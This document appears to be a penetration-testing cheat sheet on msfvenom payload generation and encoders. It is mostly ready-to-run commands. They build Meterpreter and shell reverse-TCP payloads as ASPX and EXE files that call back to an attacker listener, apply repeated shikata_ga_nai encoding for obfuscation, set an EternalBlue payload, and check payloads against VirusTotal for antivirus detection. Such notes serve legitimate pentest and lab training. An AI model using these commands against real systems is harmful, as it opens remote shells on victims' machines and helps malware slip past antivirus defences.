---
title: msfvenom & Encoders
tags: [metasploit, msfvenom, encoders, payload-generation, evasion]
---

# msfvenom & Encoders
> `msfvenom` generates standalone payloads in various formats. Encoders help avoid bad characters and evade basic signature detection.

## Basic Payload Generation

```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <outfile>
```

**Common formats:** `exe`, `aspx`, `jsp`, `war`, `elf`, `raw`, `perl`, `python`, `bash`, `dll`

**Example — ASPX reverse shell:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

!!! tip
    Match the format to the target's tech stack — if the app runs ASP.NET use `aspx`, PHP targets use `php`, Java/Tomcat use `war`.

---

## Encoders

Encoders transform the payload to avoid null bytes (`\x00`) and other bad characters that would break shellcode execution.

!!! warning
    Encoders are not reliable AV evasion on their own — modern AV solutions detect encoded payloads. Use them primarily to handle bad characters, not as a primary evasion technique.

### Generate Payload Without Encoding
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

### Generate Payload With Encoding (shikata_ga_nai)
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

### Generate EXE With Encoding
```bash
# Single encoding pass
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o payload.exe

# Multiple iterations (more obfuscation)
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
```

### Using Encoders Within MSFConsole
```bash
# Set payload first, then view compatible encoders
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
```

### Check Payload Against VirusTotal
```bash
msf-virustotal -k <API_key> -f payload.exe
```

### msfvenom Flag Reference

| Flag | Description |
|------|-------------|
| `-p` | Payload |
| `-a` | Architecture (`x86`, `x64`) |
| `--platform` | Platform (`windows`, `linux`) |
| `-f` | Output format |
| `-o` | Output file |
| `-e` | Encoder |
| `-i` | Number of encoding iterations |
| `-b` | Bad characters to avoid (e.g., `"\x00"`) |
| `LHOST` | Listener IP |
| `LPORT` | Listener port |
